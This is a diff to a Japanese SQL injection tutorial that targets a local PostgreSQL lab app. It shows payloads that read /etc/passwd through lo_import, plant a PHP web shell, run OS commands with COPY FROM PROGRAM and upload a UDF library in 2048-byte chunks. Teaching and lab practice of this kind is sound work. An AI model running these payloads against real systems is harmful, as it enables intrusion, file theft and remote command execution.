@@ -21,7 +21,7 @@
     - [Step 3: ファイル内容を書き出す](#step-3-ファイル内容を書き出す)
     - [Step 4: PHP経由でOSコマンドを実行する](#step-4-php経由でosコマンドを実行する)
   - [対策](#対策-1)
-- [COPY TO/FROM PROGRAM - RCE](#copy-tofrom-program-rce)
+- [COPY FROM PROGRAM - Command Execution](#copy-from-program-command-execution)
   - [前提条件](#前提条件-2)
   - [アイデア](#アイデア)
   - [手順](#手順-2)
@@ -93,7 +93,7 @@ http://localhost:8888/postgres.php?user=&pass='; DELETE FROM users WHERE usernam
 
 #### Step 1: 任意のファイルをlo_importでロードする
 
-Large Objectとしてファイルの内容がロードされる。
+`lo_import`で任意のファイルを読み込むことができる。データはLarge Objectとして特殊なテーブル（PG_LARGEOBJECT）に格納される。
 
 ```
 http://localhost:8888/postgres.php?user=&pass=' UNION SELECT 1,'',''||lo_import('/etc/passwd',1337);--
@@ -102,17 +102,17 @@ http://localhost:8888/postgres.php?user=&pass=' UNION SELECT 1,'',''||lo_import(
 
 #### Step 2: ファイル内容を読み出す
 
-pg_largeobjectからLarge Object内のデータを取り出す。
+PG_LARGEOBJECTからLarge Object内のデータを取り出し、UNION SELECT文を使用して出力する。
 
 ```
-http://localhost:8888/postgres.php?user=&pass=' UNION SELECT 1, '', CAST(data AS TEXT) FROM pg_largeobject WHERE loid = 1337;--+
+http://localhost:8888/postgres.php?user=&pass=' UNION SELECT 1, '', CAST(data AS TEXT) FROM PG_LARGEOBJECT WHERE loid = 1337;--+
 ```
 
 > result:
 >
 > id=1, username=, password=\x726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173680a6461656d6f6e3a783a313a313a6461656d6f6e3a2f7573722f7362696e3a2f7573722f7362696e2f6e6f6c6f67696e0a62696e3a783a323a323a62696e3a2f62696e3a2f7573722f7362696e2f6e6f6c6f67696e0a7379733a783a333a333a7379733a2f6465763a2f7573722f7362696e2f6e6f6c6f67696e0a73796e633a783a343a36353533343a73796e633a2f62696e3a2f62696e2f73796e630a67616d65733a783a353a36303a67616d65733a2f7573722f67616d65733a2f7573722f7362696e2f6e6f6c6f67696e0a6d616e3a783a363a31323a6d616e3a2f7661722f63616368652f6d616e3a2f7573722f7362696e2f6e6f6c6f67696e0a6c703a783a373a373a6c703a2f7661722f73706f6f6c2f6c70643a2f7573722f7362696e2f6e6f6c6f67696e0a6d61696c3a783a383a383a6d61696c3a2f7661722f6d61696c3a2f7573722f7362696e2f6e6f6c6f67696e0a6e6577733a783a393a393a6e6577733a2f7661722f73706f6f6c2f6e6577733a2f7573722f7362696e2f6e6f6c6f67696e0a757563703a783a31303a31303a757563703a2f7661722f73706f6f6c2f757563703a2f7573722f7362696e2f6e6f6c6f67696e0a70726f78793a783a31333a31333a70726f78793a2f62696e3a2f7573722f7362696e2f6e6f6c6f67696e0a7777772d646174613a783a33333a33333a7777772d646174613a2f7661722f7777773a2f7573722f7362696e2f6e6f6c6f67696e0a6261636b75703a783a33343a33343a6261636b75703a2f7661722f6261636b7570733a2f7573722f7362696e2f6e6f6c6f67696e0a6c6973743a783a33383a33383a4d61696c696e67204c697374204d616e616765723a2f7661722f6c6973743a2f7573722f7362696e2f6e6f6c6f67696e0a6972633a783a33393a33393a697263643a2f7661722f72756e2f697263643a2f7573722f7362696e2f6e6f6c6f67696e0a676e6174733a783a34313a34313a476e617473204275672d5265706f7274696e672053797374656d202861646d696e293a2f7661722f6c69622f676e6174733a2f7573722f7362696e2f6e6f6c6f67696e0a6e6f626f64793a783a36353533343a36353533343a6e6f626f64793a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a5f6170743a783a3130303a36353533343a3a2f6e6f6e6578697374656e743a2f62696e2f66616c73650a706f7374677265733a783a3939393a3939393a3a2f7661722f6c69622f706f737467726573716c3a2f62696e2f626173680a
 
-16進数表現をデコードする。
+内容が16進数表現でエンコードされているので、何らかの方法でデコードする。
 
 ```
 ❯ python ./scripts/hex2str.py '726f...680a'
@@ -156,9 +156,9 @@ postgres:x:999:999::/var/lib/postgresql:/bin/bash
 
 #### Step 1: Large Objectを作る
 
-lo_importでLarge Objectを作成する。
+`lo_import`でLarge Objectを作成する。
 
-第2引数のファイルパスについては、Large Objectの作成に成功するならどのファイルを指定しても問題ない。ここでは、確実に存在するファイルとして`/etc/passwd`を指定している。
+Large Objectの作成が目的なので、第2引数のファイルパスにはどのファイルを指定しても問題ない。ここでは、確実に存在するファイルとして`/etc/passwd`を指定している。
 
 ```
 http://localhost:8888/postgres.php?user=&pass=' UNION SELECT 1,'',''||lo_import('/etc/passwd',1337);--+
@@ -167,13 +167,13 @@ http://localhost:8888/postgres.php?user=&pass=' UNION SELECT 1,'',''||lo_import(
 
 #### Step 2: Large Objectを書き換える
 
-以下のデータをLarge Objectに書き込む。
+WebShellとして動作するPHPコードをLarge Objectに書き込む。
 
 ```php
 <?php $param=$_GET["cmd"]; echo shell_exec($param);
 ```
 
-16進数表現にエンコードしてからクエリに埋め込む。
+文字種制限を避けるため、16進数表現にエンコードしてからクエリに埋め込み、`decode`関数で復元する。
 
 ```
 ❯ python ./scripts/str2hex.py '<?php $param=$_GET["cmd"]; echo shell_exec($param);'
@@ -181,7 +181,7 @@ http://localhost:8888/postgres.php?user=&pass=' UNION SELECT 1,'',''||lo_import(
 ```
 
 ```
-http://localhost:8888/postgres.php?user=&pass='; UPDATE pg_largeobject SET pageno=0, data=decode('3c3f7068702024706172616d3d245f4745545b22636d64225d3b206563686f207368656c6c5f657865632824706172616d293b','hex') WHERE loid=1337;--+ 
+http://localhost:8888/postgres.php?user=&pass='; UPDATE PG_LARGEOBJECT SET pageno=0, data=decode('3c3f7068702024706172616d3d245f4745545b22636d64225d3b206563686f207368656c6c5f657865632824706172616d293b','hex') WHERE loid=1337;--+ 
 ```
 
 
@@ -214,7 +214,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 - lo_compat_privilegesオプションを無効化し、ファイルアクセスを禁止する
 
 
-## COPY TO/FROM PROGRAM - RCE
+## COPY FROM PROGRAM - Command Execution
 
 ### 前提条件
 
@@ -263,7 +263,7 @@ http://localhost:8888/postgres.php?user=&pass='; COPY cmd_exec FROM PROGRAM 'una
 
 #### Step 4: UNION SELECTで結果を読み出し
 
-コマンド実行に成功した場合、作成したテーブルの `cmd_output` 列に実行結果が格納されているので、UNION SELECTで読み出す。
+コマンド実行に成功した場合、作成したテーブルの `cmd_output` 列に実行結果が格納されているので、UNION SELECT文で読み出す。
 
 ```
 http://localhost:8888/postgres.php?user=&pass=' UNION SELECT 0,cmd_output,'' FROM cmd_exec;--+
@@ -338,14 +338,22 @@ http://localhost:8888/postgres.php?user=&pass='; SELECT lo_import('/etc/passwd',
 
 #### Step 3: Large Objectを書き換える
 
-Large Objectのページサイズは2048なので一度に2048バイトしか書き込むことができない。
+Large Objectは、1つのオブジェクトを各2048バイトのページに分割し、各ページをレコードとしてPG_LARGEOBJECTテーブルに格納する構造になっている。そのため、INSERT文を使う場合、一度に2048バイトずつしか書き込むことができない。
 
-バイナリファイルを2048バイトずつに分割し、ページをPG_LARGEOBJECTテーブルへ順番に追加していく。
+先の手順でコンパイルしたバイナリファイルを何らかの方法で2048バイトずつに分割、16進数表現に変換する。
+
+```
+❯ python scripts/generate_lo_query.py ./pg_udfsys.so 1337
+```
+
+下記のコマンドでは、PG_LARGEOBJECTテーブルへ順番に別レコードとして追加している。
+
+Large Objectを作成した際に`pageno=0`のページは作成されているはずなので、`pageno=0`のみUPDATE文を使用し、その他のページはINSERT文を使用して新規作成する。
 
 ```
 curl http://localhost:8888/postgres.php \
   -d 'user=' \
-  -d "pass='; UPDATE pg_largeobject SET pageno=0, data=decode(/*hex binary (range: 0-2047)*/,'hex') WHERE loid=1337;--+"
+  -d "pass='; UPDATE PG_LARGEOBJECT SET pageno=0, data=decode(/*hex binary (range: 0-2047)*/,'hex') WHERE loid=1337;--+"
 ```
 
 ```
@@ -355,7 +363,7 @@ curl http://localhost:8888/postgres.php \
 
 curl http://localhost:8888/postgres.php \
   -d 'user=' \
-  -d "'; INSERT INTO PG_LARGEOBJECT (loid, pageno, data) VALUES (1337, 1, decode(/*hex binary (range: 4096-6143)*/,'hex'));--+"
+  -d "'; INSERT INTO PG_LARGEOBJECT (loid, pageno, data) VALUES (1337, 2, decode(/*hex binary (range: 4096-6143)*/,'hex'));--+"
 
 ...
 ```
